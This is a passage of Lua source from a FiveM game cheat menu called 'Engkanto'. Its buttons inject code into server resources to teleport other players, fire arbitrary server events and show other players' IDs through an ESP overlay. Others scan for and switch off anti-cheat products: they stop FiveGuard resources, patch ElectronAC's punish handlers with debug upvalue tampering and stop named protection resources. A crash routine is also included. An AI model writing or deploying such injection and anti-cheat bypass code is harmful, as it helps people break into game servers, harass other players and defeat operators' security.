    if not targetId or targetId <= 0 then
        MachoMenuNotification("Engkanto", "Enter a valid player ID!")
        return
    end
    local playerId = GetPlayerFromServerId(targetId)
    if playerId == -1 then
        MachoMenuNotification("Engkanto", "Player not found!")
        return
    end
    local targetPed = GetPlayerPed(playerId)
    copiedCoords = GetEntityCoords(targetPed)
    copiedHeading = GetEntityHeading(targetPed)
    SetEntityCoordsNoOffset(PlayerPedId(), copiedCoords.x, copiedCoords.y, copiedCoords.z, false, false, false)
    SetEntityHeading(PlayerPedId(), copiedHeading)
    MachoMenuNotification("Engkanto", "Copied position of ID: " .. targetId)
end)

MachoMenuButton(ServerTabSections[1], "Restore To Original Appearance", function()
    local ped = PlayerPedId()
    SetPedDefaultComponentVariation(ped)
    ClearAllPedProps(ped)
    MachoMenuNotification("Engkanto", "Restored to original appearance.")
end)

MachoMenuButton(ServerTabSections[1], "Copy Player Outfit", function()
    local targetId = tonumber(MachoMenuGetInputbox(AdminTargetInput))
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Engkanto", "Enter a valid player ID!")
        return
    end
    local playerId = GetPlayerFromServerId(targetId)
    if playerId == -1 then
        MachoMenuNotification("Engkanto", "Player not found!")
        return
    end
    local targetPed = GetPlayerPed(playerId)
    local myPed = PlayerPedId()
    for comp = 0, 11 do
        local drawable = GetPedDrawableVariation(targetPed, comp)
        local texture = GetPedTextureVariation(targetPed, comp)
        SetPedComponentVariation(myPed, comp, drawable, texture, 0)
    end
    for prop = 0, 5 do
        local drawable = GetPedPropIndex(targetPed, prop)
        local texture = GetPedPropTextureIndex(targetPed, prop)
        if drawable ~= -1 then
            SetPedPropIndex(myPed, prop, drawable, texture, true)
        else
            ClearPedProp(myPed, prop)
        end
    end
    MachoMenuNotification("Engkanto", "Copied outfit from ID: " .. targetId)
end)

MachoMenuButton(ServerTabSections[1], "Bring Player", function()
    local targetId = tonumber(MachoMenuGetInputbox(AdminTargetInput))
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Engkanto", "Enter a valid player ID!")
        return
    end
    local myCoords = GetEntityCoords(PlayerPedId())
    MachoInjectResource('monitor', string.format([[
        local ped = GetPlayerPed(GetPlayerFromServerId(%d))
        if DoesEntityExist(ped) then
            SetEntityCoordsNoOffset(ped, %f, %f, %f, false, false, false)
        end
    ]], targetId, myCoords.x + 1.0, myCoords.y, myCoords.z))
    MachoMenuNotification("Engkanto", "Brought player ID: " .. targetId)
end)

MachoMenuButton(ServerTabSections[1], "Bring Player V2", function()
    local targetId = tonumber(MachoMenuGetInputbox(AdminTargetInput))
    if not targetId or targetId <= 0 then
        MachoMenuNotification("Engkanto", "Enter a valid player ID!")
        return
    end
    MachoInjectResource('monitor', string.format([[
        local playerPed = PlayerPedId()
        local originalPos = GetEntityCoords(playerPed)
        local targetPed = GetPlayerPed(GetPlayerFromServerId(%d))
        if targetPed and targetPed ~= 0 then
            local targetCoords = GetEntityCoords(targetPed)
            SetEntityCoords(playerPed, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
            TriggerServerEvent('ServerValidEmote', '%d', 'horse', 'horse', 1405553601)
            Citizen.Wait(100)
            SetEntityCoords(playerPed, originalPos.x, originalPos.y, originalPos.z, false, false, false, true)
        end
    ]], targetId, targetId))
    MachoMenuNotification("Engkanto", "Bring V2 sent to ID: " .. targetId)
end)

-- Settings Tab
MachoMenuButton(SettingsTabSections[1], "Force Close Menu", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
        Unloaded = true
    ]])

    MachoInjectResource((CheckResource("core") and "core") or (CheckResource("es_extended") and "es_extended") or (CheckResource("qb-core") and "qb-core") or (CheckResource("monitor") and "monitor") or "any", [[
        anvzBDyUbl = false
        if fLwYqKoXpRtB then fLwYqKoXpRtB() end
        kLpMnBvCxZqWeRt = false
    ]])

    MachoMenuDestroy(MenuWindow)
end)

local fpsBoostActive = false
MachoMenuButton(SettingsTabSections[1], "FPS Boost", function()
    fpsBoostActive = not fpsBoostActive
    if fpsBoostActive then
        MachoInjectResource("any", [[
            SetTimecycleModifier("default")
            SetTimecycleModifierStrength(1.0)
            NetworkSetFriendlyFireOption(true)
            SetArtificialLightsState(true)
            SetWeather("EXTRASUNNY")
            SetForcePedFootstepsTracks(false)
            SetForceVehicleTrails(false)
            PopulationBudgetMultiplier(0.0)
            SetVehicleDensityMultiplierThisFrame(0.0)
            SetPedDensityMultiplierThisFrame(0.0)
            SetRandomVehicleDensityMultiplierThisFrame(0.0)
            SetParkedVehicleDensityMultiplierThisFrame(0.0)
            SetShadowsDisabled(true)
            SetReflectionsDisabled(true)
        ]])
        MachoMenuNotification("Engkanto", "FPS Boost: ON")
    else
        MachoInjectResource("any", [[
            ClearTimecycleModifier()
            PopulationBudgetMultiplier(1.0)
            SetVehicleDensityMultiplierThisFrame(1.0)
            SetPedDensityMultiplierThisFrame(1.0)
            SetRandomVehicleDensityMultiplierThisFrame(1.0)
            SetParkedVehicleDensityMultiplierThisFrame(1.0)
            SetShadowsDisabled(false)
            SetReflectionsDisabled(false)
        ]])
        MachoMenuNotification("Engkanto", "FPS Boost: OFF")
    end
end)

MachoMenuText(SettingsTabSections[1], "Menu Design")
local menuColors = {
    "None",
    "Dark Violet",
    "Red",
    "Blue",
    "Green",
    "Orange",
    "Pink",
    "Cyan",
    "Yellow",
    "White"
}

local colorValues = {
    {0, 255, 255},
    {75, 0, 130},
    {180, 0, 0},
    {0, 80, 180},
    {0, 150, 0},
    {200, 80, 0},
    {180, 0, 120},
    {0, 180, 180},
    {180, 160, 0},
    {200, 200, 200}
}

local selectedColorIndex = 1

local ColorDropHandle = MachoMenuDropDown(SettingsTabSections[1], "Select Menu Color",
    function(Index)
        selectedColorIndex = Index + 1
    end,
    "None",
    "Dark Violet",
    "Red",
    "Blue",
    "Green",
    "Orange",
    "Pink",
    "Cyan",
    "Yellow",
    "White"
)

MachoMenuButton(SettingsTabSections[1], "Apply Selected Color", function()
    local c = colorValues[selectedColorIndex]
    if c then
        MachoMenuSetAccent(MenuWindow, c[1], c[2], c[3])
        MachoMenuNotification("Engkanto", "Color applied: " .. menuColors[selectedColorIndex])
    end
end)

MachoMenuText(SettingsTabSections[1], "Bindings")

MachoMenuKeybind(SettingsTabSections[1], "Opening Menu", "MOUSE ONE", function(newKey)
    MachoMenuSetKeybind(MenuWindow, newKey)
    MachoMenuNotification("Engkanto", "Hotkey updated.")
end)

MachoMenuKeybind(SettingsTabSections[1], "Noclip Mode Keybind", 0, function(key, toggle)
    selectedKey = key
end)

-- مراقبة ضغط المفتاح باستخدام MachoOnKeyDown
MachoOnKeyDown(function(key)
    if key == selectedKey and selectedKey ~= 0 then
        if not noclip then
            ActivateNoclip()
        else
            DeactivateNoclip()
        end
    end
end)
local radarInvisibilityLoop = false

local selectedKey = 0

MachoMenuKeybind(SettingsTabSections[1], "Skydive Noclip Mode Keybind", 0, function(key, toggle)
    selectedKey = key
end)

MachoOnKeyDown(function(key)
    if key == selectedKey then
        if not isNoclipEnabled then
            isNoclipEnabled = true
            local me = PlayerPedId()
            TaskSkyDive(me)
            MachoMenuNotification("Engkanto", "SkyDive activated")
        else
            isNoclipEnabled = false
            local me = PlayerPedId()
            ClearPedTasks(me)
            MachoMenuNotification("Engkanto", "SkyDive deactivate")
        end
    end
end)

    local selectedKey = 0
    local showidtx = false
    MachoMenuKeybind(SettingsTabSections[1], "TxAdmin Toggle ID Keybind", 0, function(key, toggle)
    selectedKey = key
    end)

    MachoOnKeyDown(function(key)
        if key == selectedKey then
            if not nocliptx then
                nocliptx = true
        MachoInjectResource('monitor', [[
            _G.TxIdsActive = true 
            _G.PlayerGamerTags = _G.PlayerGamerTags or {}

            local function CleanTags()
                for pid, data in pairs(_G.PlayerGamerTags) do
                    if IsMpGamerTagActive(data.gamerTag) then
                        RemoveMpGamerTag(data.gamerTag)
                    end
                end
                _G.PlayerGamerTags = {}
            end


            if sendSnackbarMessage then
                sendSnackbarMessage('info', 'nui_menu.page_main.player_ids.alert_show', true)
            end

            Citizen.CreateThread(function()
                while _G.TxIdsActive and not Unloaded do
                    local curCoords = GetEntityCoords(PlayerPedId())
                    local distanceToCheck = GetConvarInt('txAdmin-menuPlayerIdDistance', 150)

                    for _, pid in ipairs(GetActivePlayers()) do
                        local targetPed = GetPlayerPed(pid)
                        if DoesEntityExist(targetPed) then
                            -- Logic para sa paglikha at pag-update ng GamerTags (Names + IDs)
                            if not _G.PlayerGamerTags[pid] or _G.PlayerGamerTags[pid].ped ~= targetPed or not IsMpGamerTagActive(_G.PlayerGamerTags[pid].gamerTag) then
                                local playerName = string.sub(GetPlayerName(pid) or "unknown", 1, 75)
                                local playerStr = '[' .. GetPlayerServerId(pid) .. ']' .. ' ' .. playerName
                                
                                _G.PlayerGamerTags[pid] = {
                                    gamerTag = CreateFakeMpGamerTag(targetPed, playerStr, false, false, 0),
                                    ped = targetPed
                                }
                            end

                            local tag = _G.PlayerGamerTags[pid].gamerTag
                            if #(GetEntityCoords(targetPed) - curCoords) <= distanceToCheck then
                                SetMpGamerTagVisibility(tag, 0, true) -- Name
                                SetMpGamerTagVisibility(tag, 2, true) -- Health bar
                                SetMpGamerTagAlpha(tag, 2, 255)
                                
                                SetMpGamerTagHealthBarColor(tag, 129) 
                                SetMpGamerTagColour(tag, 0, 0) 

                                if NetworkIsPlayerTalking(pid) then
                                    SetMpGamerTagVisibility(tag, 4, true) -- Audio icon
                                    SetMpGamerTagColour(tag, 0, 12) 
                                else
                                    SetMpGamerTagVisibility(tag, 4, false)
                                    SetMpGamerTagColour(tag, 0, 0)
                                end
                            else

                                SetMpGamerTagVisibility(tag, 0, false)
                                SetMpGamerTagVisibility(tag, 2, false)
                                SetMpGamerTagVisibility(tag, 4, false)
                            end
                        end
                    end
                    Wait(250)
                end
                CleanTags()
            end)
            ]])
                MachoMenuNotification("Txadmin ESP", "Txadmin ESP activated")
            else
                nocliptx = false
        MachoInjectResource('monitor', [[
            _G.TxIdsActive = false
            if sendSnackbarMessage then
                sendSnackbarMessage('info', 'nui_menu.page_main.player_ids.alert_hide', true)
            end
        ]])
                MachoMenuNotification("Txadmin ESP", "Txadmin ESP deactivate")
            end
        end
    end)

-- Tools Tab
local TriggerBoxHandle = MachoMenuInputbox(ToolsTabSections[1], "Event:", "...")
local TriggerEventHandle = MachoMenuInputbox(ToolsTabSections[1], "Type:", "...")
local TriggerResourceHandle = MachoMenuInputbox(ToolsTabSections[1], "Resource:", "...")

local FallbackResources = {
    "monitor",
    "any"
}

MachoMenuButton(ToolsTabSections[1], "Execute", function()
    local RawInput = MachoMenuGetInputbox(TriggerBoxHandle)
    local TriggerType = MachoMenuGetInputbox(TriggerEventHandle)
    local TargetResource = MachoMenuGetInputbox(TriggerResourceHandle)

    if not RawInput or RawInput == "" then return end

    local argsChunk, err = load("return function() return " .. RawInput .. " end")
    if not argsChunk then return end

    local fnOk, fnOrErr = pcall(argsChunk)
    if not fnOk or type(fnOrErr) ~= "function" then return end

    local results = { pcall(fnOrErr) }
    if not results[1] then return end

    local eventName = results[2]
    local args = {}
    for i = 3, #results do
        table.insert(args, results[i])
    end

    local function formatValue(v)
        if type(v) == "string" then
            return string.format("%q", v)
        elseif type(v) == "number" or type(v) == "boolean" then
            return tostring(v)
        elseif type(v) == "table" then
            local ok, encoded = pcall(function() return json.encode(v) end)
            return ok and string.format("json.decode(%q)", encoded) or "nil"
        else
            return "nil"
        end
    end

    local formattedArgs = {}
    for _, v in ipairs(args) do
        table.insert(formattedArgs, formatValue(v))
    end
    local argsCode = #formattedArgs > 0 and table.concat(formattedArgs, ", ") or ""

    local triggerCode = string.format([[
        local event = %q
        local triggerType = string.lower(%q)
        local args = { %s }

        if triggerType == "server" then
            TriggerServerEvent(event, table.unpack(args))
        else
            TriggerEvent(event, table.unpack(args))
        end
    ]], tostring(eventName), string.lower(TriggerType or "client"), argsCode)

    local foundResource = nil

    if TargetResource and TargetResource ~= "" then
        if GetResourceState(TargetResource) == "started" then
            foundResource = TargetResource
        end
    else
        for _, fallback in ipairs(FallbackResources) do
            if GetResourceState(fallback) == "started" then
                foundResource = fallback
                break
            end
        end
    end

    if foundResource then
        MachoInjectResource(foundResource, triggerCode)
    end
end)

local targetInput = MachoMenuInputbox(ToolsTabSections[1], "Resource Name", "e.g. monitor")
local triggerInput = MachoMenuInputbox(ToolsTabSections[1], "Trigger", "e.g. Trigger")
local isLooping = false
MachoMenuCheckbox(ToolsTabSections[1], "Auto-Execute Loop",
    function()
        local targetRes = MachoMenuGetInputbox(targetInput)
        local codeToRun = MachoMenuGetInputbox(triggerInput)

        if targetRes ~= "" and codeToRun ~= "" then
            isLooping = true
            MachoMenuNotification("Loop Started", "Target: " .. targetRes)
            Citizen.CreateThread(function()
                while isLooping do
                    MachoSetLoggerState(0)
                    MachoInjectResource2(3, targetRes, codeToRun)
                    Citizen.Wait(100) 
                end
            end)
        else
            isLooping = false
            MachoMenuNotification("Input Error", "Fill up boxes first!")
        end
    end,
    
    function()
        isLooping = false
        MachoMenuNotification("Loop Stopped", "Automatic execution disabled.")
    end
)

MachoMenuButton(ToolsTabSections[1], "Execute Once", function()
    local targetRes = MachoMenuGetInputbox(targetInput)
    local codeToRun = MachoMenuGetInputbox(triggerInput)
    if targetRes ~= "" and codeToRun ~= "" then
        MachoSetLoggerState(0)
        MachoInjectResource2(3, targetRes, codeToRun)
        MachoMenuNotification("Executed", "Injected to: " .. targetRes)
    else
        MachoMenuNotification("Input Error", "Fill up both boxes!")
    end
end)

MachoMenuText(ToolsTabSections[1], "Scanners")

MachoMenuButton(ToolsTabSections[1], "Scan Server AC", function()
    local function notify(fmt, ...)
        MachoMenuNotification("Engkanto", string.format(fmt, ...))
        Print("Engkanto", string.format(fmt, ...))
    end

    local function ResourceFileExists(resourceNameTwo, fileNameTwo)
        local file = LoadResourceFile(resourceNameTwo, fileNameTwo)
        return file ~= nil
    end

    local numResources = GetNumResources()

    local acFiles = {
        { name = "ai_module_fg-obfuscated.lua", acName = "FiveGuard" },
    }

    for i = 0, numResources - 1 do
        local resourceName  = GetResourceByFindIndex(i)
        local resourceLower = string.lower(resourceName)

        for _, acFile in ipairs(acFiles) do
            if ResourceFileExists(resourceName, acFile.name) then
                notify("Anti-Cheat: %s", acFile.acName)
                AntiCheat = acFile.acName
                return resourceName, acFile.acName
            end
        end

        local friendly = nil
        if resourceLower:sub(1, 7) == "reaperv" then
            friendly = "ReaperV4"
        elseif resourceLower:sub(1, 4) == "fini" then
            friendly = "FiniAC"
        elseif resourceLower:sub(1, 7) == "chubsac" then
            friendly = "ChubsAC"
        elseif resourceLower:sub(1, 6) == "projectx" then
            friendly = "ProjectX"
        elseif resourceLower:sub(1, 7) == "drillac" then
            friendly = "DrillAC"
        elseif resourceLower:sub(-7) == "eshield" then
            friendly = "WaveShield"
        elseif resourceLower:sub(-10) == "likizao_ac" then
            friendly = "Likizao-AC"
        elseif resourceLower:sub(1, 5) == "greek" then
            friendly = "GreekAC"
        elseif resourceLower == "pac" then
            friendly = "PhoenixAC"
        elseif resourceLower == "electronac" then
            friendly = "ElectronAC"
        elseif resourceLower == "eminence" then
            friendly = "Eminence"
        end

        if friendly then
            notify("Anti-Cheat: %s", friendly)
            AntiCheat = friendly
            return resourceName, friendly
        end
    end

    notify("No Anti-Cheat found")
    return nil, nil
end)

MachoMenuButton(ToolsTabSections[1], "Scan AC II", function()
    local green, white, red, yellow = "^2", "^7", "^1", "^3"
    print(green .. "[AC Checker] " .. white .. "Scanning for high-tier protection...")

    MachoIsolatedInject([[
        local green, white, red, yellow = "^2", "^7", "^1", "^3"
        local acList = {}
        
        for i = 0, GetNumResources() - 1 do
            local name = GetResourceByFindIndex(i)
            if name and name ~= "macho" and name ~= "monitor" then
                local lowerName = name:lower()
                local author = (GetResourceMetadata(name, 'author', 0) or ""):lower()
                
                local clientFiles = (GetResourceMetadata(name, 'client_script', 0) or ""):lower()
                local serverFiles = (GetResourceMetadata(name, 'server_script', 0) or ""):lower()
                local extraMeta = (GetResourceMetadata(name, 'fiveguard', 0) or ""):lower() -- Specific for FG
                local combined = clientFiles .. serverFiles .. extraMeta .. lowerName

                local detectedAC = nil

                if lowerName:find("wave") or author:find("wave") or combined:find("wave") then
                    detectedAC = "Wave AC"

                elseif lowerName:find("fini") or author:find("fini") or combined:find("fini") then
                    detectedAC = "Fini AC"

                elseif lowerName:find("fiveguard") or combined:find("fiveguard") or combined:find("fg-") or lowerName == "seph" then
                    detectedAC = "FiveGuard"

                elseif lowerName:find("reaper") or author:find("reaper") or combined:find("reaper") then
                    detectedAC = "Reaper AC"
                
                elseif lowerName:find("electron") or author:find("electron") or combined:find("elec-") then
                    detectedAC = "Electron AC"
                
                elseif lowerName:find("aegis") or combined:find("agx") then
                    detectedAC = "Aegis X"

                elseif lowerName:find("phoenix") or lowerName:find("sentinel") then
                    detectedAC = "Sentinel/Phoenix"
                end

                if detectedAC then
                    table.insert(acList, {name = name, type = detectedAC})
                end
            end
        end

        if #acList > 0 then
            for _, ac in ipairs(acList) do
                print(green .. "[AC Checker] " .. white .. "Detected: " .. red .. ac.type .. white .. " on resource: " .. yellow .. ac.name)
            end
            print(green .. "[AC Checker] " .. white .. "Scan completed. Found ^3" .. #acList .. "^7 threats.")
        else
            print(red .. "[AC Checker] " .. white .. "No high-tier AC detected.")
        end
    ]])
end)

MachoMenuButton(ToolsTabSections[1], "Scan Resources (FOR AC)", function()
    local green, white, red, yellow = "^2", "^7", "^1", "^3"

    print(green .. "[AC Checker] " .. white .. "NAG SSCAN NG AC SA BUONG CITY...")

    MachoIsolatedInject([[
        local green, white, red, yellow = "^2", "^7", "^1", "^3"
        local acCount = 0

        for i = 0, GetNumResources() - 1 do
            local name = GetResourceByFindIndex(i)
            
            if name and name ~= "macho" and name ~= "monitor" then
                local acName = nil
                local lowerName = name:lower()
                local clientFiles = (GetResourceMetadata(name, 'client_script', 0) or ""):lower()
                local serverFiles = (GetResourceMetadata(name, 'server_script', 0) or ""):lower()
                local combined = clientFiles .. serverFiles

                if not MachoResourceInjectable(name) then
                    acName = "Protected/Hidden AC"
                end

                if not acName then
                    if lowerName:find("fiveguard") or combined:find("fiveguard") or lowerName:find("fg-") then
                        acName = "Fiveguard"
                    elseif lowerName:find("wave") or combined:find("wave") then
                        acName = "Wave AC"
                    elseif lowerName:find("reaper") or combined:find("reaper") or combined:find("v4") then
                        acName = "Reaper V4"
                    elseif lowerName:find("aegis") or lowerName:find("agx") or combined:find("agx") then
                        acName = "Aegis X"
                    elseif lowerName:find("sentinel") or combined:find("sentinel") then
                        acName = "Sentinel AC"
                    elseif lowerName:find("finiac") or lowerName:find("fini") then
                        acName = "FiniAC"
                    elseif lowerName:find("anticheat") or combined:find("anticheat") or lowerName:find("ac-") then
                        acName = "Generic AC"
                    elseif lowerName:find("shield") or combined:find("shield") then
                        acName = "Shield/Protection"
                    end
                end

                if acName then
                    acCount = acCount + 1
                    print(green .. "[AC Checker] " .. white .. "Detected: " .. red .. acName .. white .. " on resource: " .. yellow .. name)
                end
            end
        end

        if acCount > 0 then
            print(green .. "[AC Checker] " .. white .. "Scan completed. Detected " .. yellow .. tostring(acCount) .. white .. " Anti-Cheats!^7")
        else
            print(red .. "[AC Checker] " .. white .. "Wala kaming mahanap na AC. Baka 'raw' server ito!")
        end
    ]])
end)

MachoMenuButton(ToolsTabSections[1], "Scan Server Framework", function()
    local function notify(fmt, ...)
        MachoMenuNotification("Engkanto", string.format(fmt, ...))
    end

    local function IsStarted(res)
        return GetResourceState(res) == "started"
    end

    local frameworks = {
        { label = "ESX",       globals = { "ESX" },    resources = { "es_extended", "esx-legacy" } },
        { label = "QBCore",    globals = { "QBCore" }, resources = { "qb-core" } },
        { label = "Qbox",      globals = {},           resources = { "qbox" } },
        { label = "QBX Core",  globals = {},           resources = { "qbx-core" } },
        { label = "ox_core",   globals = { "Ox" },     resources = { "ox_core" } },
        { label = "ND_Core",   globals = { "NDCore" }, resources = { "nd-core", "ND_Core" } },
        { label = "vRP",       globals = { "vRP" },    resources = { "vrp" } },
    }

    local function DetectFramework()
        for _, fw in ipairs(frameworks) do
            for _, g in ipairs(fw.globals) do
                if _G[g] ~= nil then
                    return fw.label
                end
            end
        end
        for _, fw in ipairs(frameworks) do
            for _, r in ipairs(fw.resources) do
                if IsStarted(r) then
                    return fw.label
                end
            end
        end
        return "Standalone"
    end

    local frameworkName = DetectFramework()
    notify("Framework: %s", frameworkName)
end)

MachoMenuButton(ToolsTabSections[1], "Scan Server Ip Address", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
    -- Storage variable to hold the scanned IP details
local serverIP = "Unknown"
local serverPort = "Unknown"

local function ScanServerIP()
    -- 1. Grab the raw endpoint from the client
    local endpoint = GetCurrentServerEndpoint()

    if endpoint and endpoint ~= "" then
        -- 2. Parse the IP and Port using pattern matching
        -- This splits the string at the colon ':'
        local ip, port = endpoint:match("([^:]+):([^:]+)")
        
        if ip and port then
            serverIP = ip
            serverPort = port
        else
            -- Fallback if the endpoint format doesn't have a port
            serverIP = endpoint
            serverPort = "Default (30120)"
        end
        
        -- Print the results to your F8 client console
        print("^2[SCANNER] Successfully scanned current server!^7")
        print(string.format("^3IP Address:^7 %s", serverIP))
        print(string.format("^3Port:^7       %s", serverPort))
    else
        print("^1[SCANNER] Error: Could not retrieve server endpoint. Are you offline?^7")
        serverIP = "Not Found"
        serverPort = "Not Found"
    end
end
-- Run the function
ScanServerIP()
  ]])
end)

MachoMenuButton(ToolsTabSections[1], "Scan Server Resources", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
    local function LogServerResources()

    local numResources = GetNumResources()
    print("Total Loaded Resources: " .. tostring(numResources))

    for i = 0, numResources - 1 do
        local resourceName = GetResourceByFindIndex(i)
        
        -- Ensure the resource name is valid before querying its state
        if resourceName then
            local state = GetResourceState(resourceName)
            
            -- Log only resources that are currently running
            if state == "started" then
                print(string.format("Engkanto Founded: %s", resourceName))
            end
        end
    end
end
-- Run the function
LogServerResources()
  ]])
end)

MachoMenuButton(ToolsTabSections[1], "Scan Triggers", function()
MachoInjectResource('monitor', [[
local triggersQueue = {}      -- queued triggers to display
local activeLines = {}        -- triggers currently visible
local colors = {}             -- random colors per trigger
local startY = 0.95           -- bottom of screen
local startX = 0.005          -- left margin
local lineHeight = 0.02       -- spacing between lines
local scrollSpeed = 0.0008    -- upward scroll speed
local displayTime = 2000      -- ms line stays visible before fading
local fadeTime = 500          -- ms fade out duration
local lineDelay = 100         -- ms delay between new lines
local overlayActive = true

local function randomColor()
    return {r = math.random(50,255), g = math.random(50,255), b = math.random(50,255)}
end

local function addTrigger(call)
    if not colors[call] then
        colors[call] = randomColor()
    end
    table.insert(triggersQueue, call)
    print("[Trigger] " .. call) -- log to F8 console
end

Citizen.CreateThread(function()
    for i = 0, GetNumResources() - 1 do
        local resName = GetResourceByFindIndex(i)
        local numFiles = GetNumResourceMetadata(resName, "client_script")
        if numFiles > 0 then
            for j = 0, numFiles - 1 do
                local scriptName = GetResourceMetadata(resName, "client_script", j)
                local scriptContent = LoadResourceFile(resName, scriptName)
                if scriptContent then
                    for line in scriptContent:gmatch("[^\r\n]+") do
                        local eventCall = line:match('TriggerServerEvent%s*%((.-)%)')
                        if eventCall then
                            addTrigger("TriggerServerEvent(" .. eventCall .. ")")
                        end
                    end
                end
            end
        end
    end
end)

Citizen.CreateThread(function()
    while overlayActive do
        Citizen.Wait(lineDelay)
        if #triggersQueue > 0 then
            local call = table.remove(triggersQueue, 1)
            table.insert(activeLines, {text = call, y = startY, time = 0})
        elseif #activeLines == 0 then
            overlayActive = false -- stop when done
        end
    end
end)

Citizen.CreateThread(function()
    while overlayActive do
        Citizen.Wait(0)
        local dt = 1 / 60

        for i = #activeLines, 2, -1 do
            local above = activeLines[i-1]
            local current = activeLines[i]
            if current.y - above.y < lineHeight then
                above.y = current.y - lineHeight
            end
        end

        for i = #activeLines, 1, -1 do
            local line = activeLines[i]
            line.y = line.y - scrollSpeed
            line.time = line.time + dt * 1000

            local alpha = 255
            if line.time >= displayTime then
                alpha = 255 * math.max(0, 1 - ((line.time - displayTime) / fadeTime))
            end

            if alpha <= 0 or line.y < 0 then
                table.remove(activeLines, i)
            else
                local color = colors[line.text]
                SetTextFont(0)
                SetTextProportional(1)
                SetTextScale(0.25, 0.25)
                SetTextColour(color.r, color.g, color.b, math.floor(alpha))
                SetTextDropShadow(0,0,0,0,255)
                SetTextEdge(1,0,0,0,255)
                SetTextOutline()
                SetTextEntry("STRING")
                AddTextComponentString(line.text)
                DrawText(startX, line.y)
            end
        end
    end
end)


]])

end)

MachoMenuButton(ToolsTabSections[1], "Scan Nearby Players", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("FiveGuard") and "FiveGuard" or "any", [[
-- Function to get nearby players' server IDs and names
local function getNearbyPlayers()
    -- Get the player's current position
    local playerPed = PlayerPedId()
    local playerPos = GetEntityCoords(playerPed)

    -- Get all players on the server
    local players = GetActivePlayers()

    -- Loop through all players
    for _, playerId in ipairs(players) do
        local targetPed = GetPlayerPed(playerId)
        local targetPos = GetEntityCoords(targetPed)

        -- Calculate the distance between the player and the target
        local distance = #(playerPos - targetPos)

        -- If the target is within 50 meters and not the current player
        if distance < 1000.0 and playerId ~= PlayerId() then
            local playerName = GetPlayerName(playerId)  -- Get the player's FiveM name
            local serverId = GetPlayerServerId(playerId)  -- Get the player's server ID
            print(string.format("%s (ID: %d) is %.2f meters away.", playerName, serverId, distance))
        end
    end
end

-- Run the function
getNearbyPlayers()
  ]])
end)

MachoMenuText(ToolsTabSections[1], "Misc")
MachoMenuCheckbox(ToolsTabSections[1], "AC Screen Recorder Blocker",
    function()
        _G.AntiVisualLogging = true
        MachoInjectResource('monitor', [[
            _G.AntiVisualLogging = true
            print("Visual Shield Active")
        ]])
    end,
    function()
        _G.AntiVisualLogging = false
        MachoInjectResource('monitor', [[
            _G.AntiVisualLogging = false
        ]])
    end)

MachoMenuButton(ToolsTabSections[1], "Crash Game (Safe Exit)", function()
    MachoInjectResource("monitor", [[
        Citizen.CreateThread(function()
            print("^1[ERROR] ^7CCitizen-Executable: Exception (0xc0000005) at 0x1406e4a2b.")
            print("^1[ERROR] ^7Resource 'monitor' failed to fetch local player data (Buffer Overflow).")
            
            Wait(500)

            local crash = "A"
            while true do
                crash = crash .. crash
            end
        end)
    ]])
end)


MachoMenuText(ToolsTabSections[1], "Bypass")

MachoMenuButton(ToolsTabSections[1], "Bypass FiveGuard", function()
    Citizen.CreateThread(function()
        local resources = GetNumResources()
        for i = 0, resources - 1 do
            local resource = GetResourceByFindIndex(i)
            local files = GetNumResourceMetadata(resource, 'client_script')
            for j = 0, files - 1 do
                local x = GetResourceMetadata(resource, 'client_script', j)
                if x ~= nil and string.find(x, "obfuscated") then
                    MachoMenuNotification("FiveGuard AC Detected", "Blocking resource: " .. resource)
                    MachoResourceStop(resource)
                    MachoMenuNotification("FiveGuard Blocked", "Resource " .. resource .. " stopped.")
                    break
                end
            end
        end
    end)
end)

MachoMenuButton(ToolsTabSections[1], "Bypass Electron (RRYBAN) TESTING PALANG", function()
MachoInjectResource2(2, "ElectronAC", [[
            pcall(function()
                local name, eventHandlersRaw = debug.getupvalue(_G["RemoveEventHandler"], 2)
                local eventHandlers = {}
                for name, raw in pairs(eventHandlersRaw) do
                    if raw.handlers then
                        for id, v in pairs(raw.handlers) do
                            table.insert(eventHandlers, { handle = { ['key'] = id, ['name'] = name }, func = v, type = (string.find(name, "__cfx_nui") and "NUICallback") or (string.find(name, "__cfx_export") and "Export") or "Event" })
                        end
                    end
                end
                local eAcVerify
                for i, v in pairs(eventHandlers) do
                    local name = v["handle"]["name"]
                    local func = v["func"]
                    if name == "ElectronAC.verify" then
                        local upname, func = debug.getupvalue(func, 1)
                        eAcVerify = func
                    end
                end
                local EACTable = nil
                local eacUpvalueIndex = nil
                local i = 1
                while true do
                    local name, value = debug.getupvalue(eAcVerify, i)
                    if not name then break end
                    if type(value) == "table" then
                        local hasEACStructure = false
                        for idx, tbl in pairs(value) do
                            if type(tbl) == "string" then
                                if tbl == "antiNuiBlocker" or tbl == "antiInvisible" then
                                    hasEACStructure = true
                                end
                                if hasEACStructure then break end
                            end
                        end
                        if hasEACStructure then
                            EACTable = value
                            eacUpvalueIndex = i
                            break
                        end
                    end
                    i = i + 1
                end
                if not EACTable then
                    print("Diddy.")
                    return
                end
                local punish = function(...) return end
                for idx, tbl in pairs(EACTable) do
                    if type(tbl) == "table" then
                        for subIdx, subTbl in pairs(tbl) do
                            if type(subTbl) == "table" and type(subTbl["punish"]) == "function" and subTbl["punish"] then
                                subTbl["punish"] = punish
                            end
                        end
                    end
                end
                Debug.setupvalue(eAcVerify, eacUpvalueIndex, EACTable)
                print("ElectronAC was fucked and sucked.")
            end)
        ]])
    end)

MachoMenuButton(ToolsTabSections[1], "Bypass Miami", function()
    MachoInjectResource('vrp', [[
        MachoResourceStop("Flix-Protection")
        MachoResourceStop("Ho-Menu")
        MachoResourceStop("Ho-NotifyX")
        MachoResourceStop("G8-EmtoteSV4")
        MachoResourceStop("3_samir_tdreb_alofa3_miamicity")
        MachoResourceStop("Danger_DoorLock")
    ]])
    MachoMenuNotification("Engkanto", "All Miami resources stopped!")
end)

MachoMenuButton(ToolsTabSections[1], "ByPass SafeArea", function()
        MachoInjectResource('vrp', [[
            Citizen.CreateThread(function()
                while true do
                    Citizen.Wait(0)
                    SetCanAttackFriendly(PlayerPedId(), true, true)
                    NetworkSetFriendlyFireOption(true)
